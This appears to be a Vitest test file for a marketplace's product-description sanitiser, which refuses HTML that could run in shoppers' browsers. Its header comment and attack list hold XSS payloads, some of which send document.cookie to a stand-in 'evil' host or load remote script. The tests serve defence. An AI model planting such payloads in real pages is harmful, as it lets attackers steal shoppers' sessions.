/**
 * What a seller may put in a product description.
 *
 * THE HOLE THIS CLOSES
 *   frontend/src/pages/customer/ProductDetailsPage.jsx renders
 *   `product.description` with dangerouslySetInnerHTML and does not sanitise
 *   it. Whatever reaches that field RUNS in the shopper's browser.
 *
 *   That was harmless while the only person adding products was the owner. It
 *   stops being harmless the day a third-party seller joins - which is the
 *   marketplace this was decided to be on 7 September 2026. A seller could put
 *
 *       <img src=x onerror="fetch('https://evil/'+document.cookie)">
 *
 *   in their own description and take the session of everybody who opened
 *   their product page.
 *
 * WHY IT REFUSES INSTEAD OF CLEANING
 *   Every published XSS bypass is somebody's sanitiser disagreeing with a
 *   browser about what a malformed tag means. There is no parser here to
 *   disagree with: the allowed tags are removed, and if any angle bracket
 *   survives, the description does not go in the database.
 *
 * The rules being defended:
 *   1. the ordinary tags a description needs are allowed
 *   2. anything that can execute is refused
 *   3. an attribute is refused even on an allowed tag - that is where onerror
 *      and href live
 *   4. the refusal names what was wrong, so a seller can fix it
 *   5. the check is on the MODEL, so no writer can skip it
 */
import { describe, it, expect } from 'vitest';
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

const { checkDescriptionHtml, isSafeDescriptionHtml } = require('../utils/safeHtml');
const Product = require('../models/Product');
const mongoose = require('mongoose');

describe('descriptions a seller may write', () => {
  const allowed = [
    'Plain text with no markup at all.',
    '<p>A single paragraph.</p>',
    '<p>Two paragraphs.</p><p>Like this.</p>',
    '<p>With <strong>bold</strong> and <em>italic</em>.</p>',
    '<ul><li>One</li><li>Two</li></ul>',
    '<ol><li>First</li></ol>',
    '<p>A line<br>break.</p>',
    '<p>A self-closed break<br/>here.</p>',
    '<p>Ampersands &amp; entities are fine.</p>',
  ];

  for (const html of allowed) {
    it(`allows: ${html.slice(0, 50)}`, () => {
      expect(checkDescriptionHtml(html)).toEqual({ ok: true });
    });
  }

  it('allows an empty description, which the required rule handles separately', () => {
    expect(isSafeDescriptionHtml('')).toBe(true);
  });
});

describe('descriptions that would run code in a shopper’s browser', () => {
  const attacks = [
    '<script>fetch("https://evil/"+document.cookie)</script>',
    '<p>Nice ring</p><script src="https://evil/x.js"></script>',
    '<img src=x onerror="fetch(\'https://evil/\'+document.cookie)">',
    '<iframe src="https://evil"></iframe>',
    '<svg/onload=alert(1)>',
    '<body onload=alert(1)>',
    '<a href="javascript:alert(1)">click</a>',
    '<object data="evil.swf"></object>',
    '<embed src="evil">',
    '<style>body{display:none}</style>',
    '<form action="https://evil"><input name="card"></form>',
    '<div onmouseover="steal()">hover</div>',
    '<math><mtext><script>alert(1)</script></mtext></math>',
    '<p>text</p><!--<script>alert(1)</script>-->',
  ];

  for (const html of attacks) {
    it(`refuses: ${html.slice(0, 50)}`, () => {
      expect(isSafeDescriptionHtml(html)).toBe(false);
    });
  }
});

describe('attributes, which is where the danger actually lives', () => {
  it('refuses one even on a tag that is otherwise allowed', () => {
    // <p> is fine. <p onclick=...> is the same attack in a permitted costume.
    expect(isSafeDescriptionHtml('<p onclick="steal()">Nice</p>')).toBe(false);
    expect(isSafeDescriptionHtml('<p class="pretty">Nice</p>')).toBe(false);
    expect(isSafeDescriptionHtml('<strong style="x">Nice</strong>')).toBe(false);
    expect(isSafeDescriptionHtml('<li data-x="1">One</li>')).toBe(false);
  });

  it('says which tag was wrong, so it can be fixed', () => {
    const attribute = checkDescriptionHtml('<p class="x">Nice</p>');
    expect(attribute.reason).toMatch(/<p>/);
    expect(attribute.reason).toMatch(/attributes/i);

    const forbidden = checkDescriptionHtml('<p>Nice</p><script>x()</script>');
    expect(forbidden.reason).toMatch(/<script>/);

    const comment = checkDescriptionHtml('<p>Nice</p><!-- pasted from Word -->');
    expect(comment.reason).toMatch(/comment/i);

    const stray = checkDescriptionHtml('Under 5 < 10 rupees');
    expect(stray.reason).toMatch(/stray/i);
  });
});

describe('where the check lives', () => {
  const build = (description) =>
    new Product({
      sellerId: new mongoose.Types.ObjectId(),
      name: 'Antique Gold Temple Necklace',
      description,
      category: new mongoose.Types.ObjectId(),
      price: 6800,
      stock: 3,
    });

  const ATTACK = '<p>Nice</p><script>alert(1)</script>';
  const FINE = '<p>A gold-toned temple necklace for weddings and festivals.</p>';

  /**
   * THE REGRESSION THIS EXISTS FOR
   *   The rule was first written as a pre('validate') hook, and it was
   *   silently useless. sellerController checks a new product with
   *   `product.validateSync()` BEFORE uploading its images - deliberately, so
   *   a rejected product leaves no paid-for Cloudinary storage behind - and
   *   validateSync does not run async middleware.
   *
   *   So a description carrying a <script> passed the early check, the images
   *   and video were uploaded and paid for, and only then did save() refuse.
   *   A path validator runs in both.
   */
  it('refuses in validateSync, which is where the controller checks first', () => {
    const error = build(ATTACK).validateSync();

    expect(error).toBeTruthy();
    expect(error.errors.description.message).toMatch(/<script>/);
  });

  it('refuses in the async path too', async () => {
    await expect(build(ATTACK).validate()).rejects.toThrow(/<script>/);
  });

  it('lets an ordinary description through, both ways', async () => {
    expect(build(FINE).validateSync()).toBeUndefined();
    await expect(build(FINE).validate()).resolves.toBeUndefined();
  });
});
